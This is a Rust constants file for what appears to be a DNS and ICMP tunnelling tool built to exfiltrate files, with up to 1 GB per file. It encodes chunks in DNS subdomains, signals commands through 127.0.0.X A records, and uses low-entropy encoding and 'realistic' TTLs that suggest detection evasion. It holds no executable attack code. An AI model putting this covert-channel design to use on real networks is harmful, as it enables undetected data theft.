//! Protocol constants and configuration values.

/// Default chunk size in bytes (optimized for DNS subdomain encoding)
pub const DEFAULT_CHUNK_SIZE: usize = 32;

/// Maximum DNS label length (RFC 1035)
pub const MAX_LABEL_LENGTH: usize = 63;

/// Maximum QNAME length (RFC 1035)
pub const MAX_QNAME_LENGTH: usize = 253;

/// Default sliding window size (number of outstanding chunks)
pub const DEFAULT_WINDOW_SIZE: usize = 8;

/// Default rolling window size for coherence protocol
pub const DEFAULT_ROLLING_SIZE: usize = 4;

/// Default TTL for DNS responses (seconds) - realistic value
pub const DEFAULT_TTL: u32 = 300;

/// Minimum TTL for DNS responses
pub const MIN_TTL: u32 = 60;

/// Maximum TTL for DNS responses
pub const MAX_TTL: u32 = 3600;

/// Default sleep duration when throttled (seconds)
pub const DEFAULT_SLEEP_DURATION: u64 = 30;

/// Maximum retransmission attempts before giving up
pub const MAX_RETRANSMIT_ATTEMPTS: u32 = 5;

/// Timeout for DNS queries (milliseconds)
pub const DNS_QUERY_TIMEOUT_MS: u64 = 5000;

/// Default port for DNS server
pub const DNS_SERVER_PORT: u16 = 53;

/// ICMP echo request type
pub const ICMP_ECHO_REQUEST: u8 = 8;

/// ICMP echo reply type
pub const ICMP_ECHO_REPLY: u8 = 0;

/// Magic bytes for ICMP payload identification
pub const ICMP_MAGIC: [u8; 4] = [0x47, 0x51, 0x50, 0x21]; // "GQP!"

/// A record base for command encoding (127.0.0.X)
pub const COMMAND_IP_BASE: [u8; 3] = [127, 0, 0];

/// Special A record for dirty bit / retransmit request
pub const DIRTY_BIT_IP: [u8; 4] = [127, 0, 0, 2];

/// Special A record for acknowledgment
pub const ACK_IP: [u8; 4] = [127, 0, 0, 1];

/// Special A record for session complete
pub const COMPLETE_IP: [u8; 4] = [127, 0, 0, 5];

/// Special A record for error
pub const ERROR_IP: [u8; 4] = [127, 0, 0, 6];

/// Encryption key size (AES-256)
pub const ENCRYPTION_KEY_SIZE: usize = 32;

/// Nonce size for AES-GCM
pub const NONCE_SIZE: usize = 12;

/// Authentication tag size for AES-GCM
pub const TAG_SIZE: usize = 16;

/// Dictionary size for low-entropy encoding
pub const DICTIONARY_SIZE: usize = 256;

/// Maximum file size for exfiltration (1 GB)
pub const MAX_FILE_SIZE: u64 = 1024 * 1024 * 1024;

/// Buffer size for file reading
pub const FILE_BUFFER_SIZE: usize = 8192;

